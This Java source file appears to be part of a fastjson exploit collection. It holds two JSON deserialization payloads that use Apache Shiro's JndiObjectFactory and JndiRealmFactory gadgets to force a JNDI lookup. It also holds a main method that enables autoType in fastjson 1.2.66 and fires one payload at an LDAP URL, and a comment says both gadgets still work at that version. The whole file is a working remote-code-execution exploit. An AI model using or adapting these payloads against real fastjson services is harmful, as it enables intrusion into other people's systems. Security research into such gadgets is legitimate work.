package fastjsonExp;
import org.apache.shiro.jndi.JndiObjectFactory;
import utils.FastjsonVersionCtr;
import utils.StringUtils;
import org.apache.shiro.realm.jndi.JndiRealmFactory;

import javax.naming.NamingException;

/**
 * 已完成
 * org.apache.shiro.jndi.JndiObjectFactory
 * org.apache.shiro.realm.jndi.JndiRealmFactory
 * both of them still work at fastjson 1.2.66
 */
public class EXP4shiro {
    public String JNDI_URL = "";
    public String payload1 = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"replace_here\"}";
    public String payload2 = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\",\"jndiNames\":[\"replace_here\"]}";
    public  void actual_fun(String url){
        JndiObjectFactory jndiObjectFactory = new JndiObjectFactory();
        jndiObjectFactory.setResourceName(url);
        jndiObjectFactory.getInstance();
    }
    public  void actual_fun(){
        if(!StringUtils.isNull(this.JNDI_URL)){
            actual_fun(this.JNDI_URL);
        }
    }
    public  void actual_fun2(String url){
        JndiRealmFactory jndiRealmFactory = new JndiRealmFactory();
        jndiRealmFactory.setJndiNames(url);
        jndiRealmFactory.getRealms();
    }
    public  void actual_fun2(){
        if(!StringUtils.isNull(this.JNDI_URL)){
            actual_fun2(this.JNDI_URL);
        }
    }
    public EXP4shiro(){}
    public EXP4shiro(String uri){
        this.JNDI_URL = uri;
        this.payload1 = this.payload1.replace("replace_here",uri);
        System.out.println(this.payload1);

        this.payload2 = this.payload2.replace("replace_here",uri);
        System.out.println(this.payload2);
    }
    public String getPayload1(){
        return this.payload1;
    }
    public String getPayload2(){
        return this.payload2;
    }
    public static void main(String[] args) throws Exception{
        FastjsonVersionCtr myFastjson = new FastjsonVersionCtr("1.2.66");
        myFastjson.mySetAutoType(true);
        EXP4shiro exp = new EXP4shiro("ldap://127.0.0.1:1389/run");
        myFastjson.myParseObject(exp.getPayload2());
        //exp.actual_fun2();
        myFastjson.clear();

    }


}
